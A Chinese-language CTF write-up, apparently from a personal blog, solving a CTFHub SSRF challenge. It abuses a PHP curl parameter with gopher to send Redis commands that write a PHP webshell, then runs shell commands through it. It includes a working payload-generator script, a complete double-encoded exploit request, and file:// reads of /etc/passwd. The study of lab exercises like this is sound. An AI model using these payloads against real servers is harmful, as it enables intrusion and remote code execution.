---
title: "CTFHub SSRF 实战：Redis 协议攻击与 Webshell 写入"
date: 2026-06-11T00:30:00+08:00
draft: false
tags: ["CTF", "Web安全", "SSRF", "Redis", "Gopher", "Webshell", "CTFHub"]
categories: ["WriteUp"]
---

## 一、题目信息

- **平台**：CTFHub
- **分类**：Skill / Web / SSRF
- **考点**：SSRF（服务器端请求伪造）、Redis 协议、Gopher 协议、Redis 持久化漏洞、Webshell 写入
- **工具**：自写 Python 脚本、cURL、Burp Suite

题目给出一个 `?url=` 参数，服务器使用 PHP curl 代为请求用户指定的地址。

```
http://challenge-xxxx.sandbox.ctfhub.com:10800/?url=
```

目标是通过 SSRF 攻击内网的 **Redis** 服务（通常运行在 `127.0.0.1:6379`），利用 Redis 的 `SAVE` 命令将 Webshell 写入到 Web 根目录，最终实现远程代码执行（RCE）并读取 flag。

---

## 二、环境探测与分析

### 2.1 确认 SSRF 存在

```bash
curl -s "http://target/?url=file:///etc/passwd"
```

返回了 `/etc/passwd` 内容，确认存在 SSRF。

### 2.2 读取源码分析

```bash
curl -s "http://target/?url=file:///var/www/html/index.php"
```

源码：

```php
<?php
error_reporting(0);

if (!isset($_REQUEST['url'])) {
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```

关键点：
- 使用 `$_REQUEST['url']` 接收参数，支持 GET/POST
- 使用 `curl_exec()` 执行请求，支持多种协议（http/https/ftp/gopher/file 等）
- `CURLOPT_FOLLOWLOCATION` 开启了跟随重定向

### 2.3 确认 Redis 服务存活

```bash
curl -s "http://target/?url=gopher://127.0.0.1:6379/_test"
```

返回 `504 Gateway Time-out`，说明服务器确实尝试连接了 `127.0.0.1:6379`，只是 gopher payload 不正确导致 Redis 未正确响应。

### 2.4 确认 Web 根目录

```bash
curl -s "http://target/?url=file:///etc/apache2/sites-enabled/000-default.conf"
```

发现 `DocumentRoot /var/www/html`。

---

## 三、Redis 攻击原理

### 3.1 为什么能写文件？

Redis 提供了 `SAVE` 和 `BGSAVE` 命令用于数据持久化，默认将内存数据保存为 RDB 文件。RDB 的保存路径和文件名可以通过 `CONFIG SET` 动态修改：

```redis
CONFIG SET DIR /var/www/html        # 修改保存目录
CONFIG SET DBFILENAME shell.php     # 修改保存文件名
SET x "<?php system($_GET[1]);?>"  # 写入恶意代码
SAVE                                # 保存到磁盘
```

执行后，Redis 会在 `/var/www/html/shell.php` 生成一个文件。虽然文件开头有 Redis RDB 的二进制头部（`REDIS0007`），但 PHP 解析器会从 `<?php` 标签开始执行，前面的二进制字符只是被当作 HTML 文本输出，不影响 PHP 代码的执行。

### 3.2 利用条件

- Redis 未设置密码（或密码已知）
- Redis 进程对目标目录有写权限
- Web 服务器会将写入的文件当作 PHP 解析

---

## 四、Redis 协议（RESP）

Redis 使用 **RESP（REdis Serialization Protocol）** 文本协议。命令格式如下：

```
*3
$3
set
$1
x
$29


<?php system($_GET[1]);?>



```

含义：
- `*3`：数组，3 个元素
- `$3`：第一个字符串长度 3，值为 `set`
- `$1`：第二个字符串长度 1，值为 `x`
- `$29`：第三个字符串长度 29，值为 `<?php system($_GET[1]);?>`（包含前后换行）
- `\r\n`：每条结束符

**注意**：Redis 协议严格要求使用 `\r\n`（CRLF）作为换行符，不能用 `\n`（LF）。

---

## 五、Gopher 协议的坑

Gopher URL 格式：`gopher://host:port/_selector`

**关键坑点**：curl 发送 gopher 请求时，**会在 selector 末尾自动追加 `\r\n`**。

如果我们的 payload 末尾也有 `\r\n`：
- payload 结尾：`save\r\n`
- gopher 自动追加：`\r\n`
- Redis 收到：`save\r\n\r\n`

Redis 会把最后一个 `\r\n` 当作一条**空命令**，然后报错：
```
-ERR Protocol error: invalid multibulk length
```

**解决办法**：手动去掉 payload 末尾的 `\r\n`，让 gopher 自动追加的那个 `\r\n` 正好充当 `save` 命令的结束符。

---

## 六、双重 URL 编码

和 FastCGI 一样，通过 `?url=` 传递 gopher URL 时，需要**二次编码**：

1. 第一次编码：Redis 协议中的 `\r\n` 变成 `%0D%0A`
2. 第二次编码：通过 `?url=` 发送时，PHP 会 decode 一次，所以 `%` 要变成 `%25`

最终发送：
```
?url=gopher://127.0.0.1:6379/_%252A1%250D%250A...
```

- 服务器收到：`%252A1%250D%250A...`
- PHP 解码一次：`%2A1%0D%0A...`
- curl 再解码：`*1\r\n...`

---

## 七、详细解题步骤

### 7.1 手动构造 Payload

```python
import urllib.parse

def redis_cmd(*parts):
    cmd = f"*{len(parts)}\r\n"
    for p in parts:
        cmd += f"${len(p)}\r\n{p}\r\n"
    return cmd

content = '\n\n<?php system($_GET[1]);?>\n\n\n'

payload = ""
payload += redis_cmd("flushall")
payload += redis_cmd("set", "1", content)
payload += redis_cmd("config", "set", "dir", "/var/www/html")
payload += redis_cmd("config", "set", "dbfilename", "shell.php")
payload += redis_cmd("save")

# 关键：去掉末尾 \r\n，避免 gopher 自动追加后导致协议错误
payload = payload[:-2]

encoded = urllib.parse.quote_plus(payload)
raw = f"gopher://127.0.0.1:6379/_{encoded}"
double = raw.replace('%', '%25')

print(double)
```

### 7.2 发送 Payload 写 Shell

```bash
curl -s -m 8 "http://target/?url=<二次编码后的payload>"
```

`-m 8` 设置最多等待 8 秒。Redis `SAVE` 执行需要时间，PHP curl 会等待响应直到 Nginx 超时返回 504。**504 不代表失败**，只是网关超时，shell 可能已经写进去了。

### 7.3 验证 Shell 是否存在

```bash
curl -s "http://target/shell.php?1=ls%20-la%20/"
```

如果返回了目录列表（前面带 `REDIS0007` 二进制头），说明 PHP 代码执行成功了。

### 7.4 找 flag 文件名并读取

```bash
# 找 flag
curl -s "http://target/shell.php?1=ls%20-la%20/" | strings | grep flag

# 读 flag
curl -s "http://target/shell.php?1=cat%20/flag_xxx" > /tmp/flag.txt
strings /tmp/flag.txt | grep ctfhub
```

---

## 八、踩坑记录

### 8.1 `LineN` 后处理器不适用于 Redis

之前用 Gopherus 工具时，FastCGI 需要把 `%0D%0A` 换成 `%0A`，所以用了 `LineN` 后处理器。**Redis 必须用 `%0D%0A`（CRLF）**，用 `LineN` 替换后会导致 Redis 协议解析失败。

### 8.2 504 超时不是失败

Redis `SAVE` 命令执行后不会主动关闭连接，PHP curl 一直等待，直到 Nginx 超时返回 504。只要没有返回 `Connection refused`，就说明命令已经送达 Redis。

### 8.3 文件开头有 `REDIS0007` 不影响执行

`SAVE` 保存的是 RDB 格式，文件开头有二进制头。但 PHP 解析器会从 `<?php` 开始执行，前面的二进制字符只是被当作文本输出，不影响代码执行。

### 8.4 Burp 二次编码问题

在 Burp Repeater URL 栏输入 `%2501` 会被再次编码为 `%252501`。解决方法：
- 在 **Raw** 标签页直接贴入完整的 HTTP 请求
- 或使用原始一次编码版本，让 Burp 自动编码一次

---

## 九、完整 HTTP 请求（Burp Raw 可用）

```http
GET /?url=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252430%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B1%255D%2529%253B%253F%253E%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%252Fvar%252Fwww%252Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave HTTP/1.1
Host: challenge-xxxx.sandbox.ctfhub.com:10800
```

---

## 十、自动化脚本

为了简化操作，我写了两个脚本：

- **FastCGI 攻击脚本**：[`/tools/generate_fastcgi_payload.py`](/san-blog/tools/generate_fastcgi_payload.py)
- **Redis 攻击脚本**：[`/tools/generate_redis_payload_v2.py`](/san-blog/tools/generate_redis_payload_v2.py)

### Redis 脚本用法

```bash
python3 generate_redis_payload_v2.py
```

输出：
- `[1]` 原始 Gopher URL
- `[2]` 二次编码 URL（用于 `?url=`）
- `[3]` Webshell 访问地址
- `[4]` 一条龙 curl 命令

### FastCGI 脚本用法

```bash
python3 generate_fastcgi_payload.py -C "cat /flag"
```

---

## 十一、总结

| 步骤 | 操作 | 目的 |
|------|------|------|
| 1 | `file:///etc/passwd` | 确认 SSRF 存在 |
| 2 | `gopher://127.0.0.1:6379/_test` | 确认 Redis 存活 |
| 3 | 构造 RESP 协议 Payload | 生成 Redis 命令序列 |
| 4 | 去掉末尾 `\r\n` | 避免 gopher 自动追加导致协议错误 |
| 5 | 双重 URL 编码 | 确保 payload 正确传递 |
| 6 | 发送 Payload | 执行 `flushall -> set -> config -> save` |
| 7 | 访问 `shell.php?1=cat%20/flag` | 执行命令拿 flag |

**核心知识点**：
- Redis `SAVE` 可以写任意文件，配合 `CONFIG SET DIR/DBFILENAME` 实现任意文件写入
- SSRF 通过 Gopher 协议发送原始 TCP 数据到内网 Redis
- RESP 协议要求 CRLF（`\r\n`），不能用 LF
- Gopher 协议会自动在 selector 末尾追加 `\r\n`
- 遇到二进制响应时，用 `strings` 提取或让命令输出 base64

---

**Flag**：`ctfhub{xxx}`
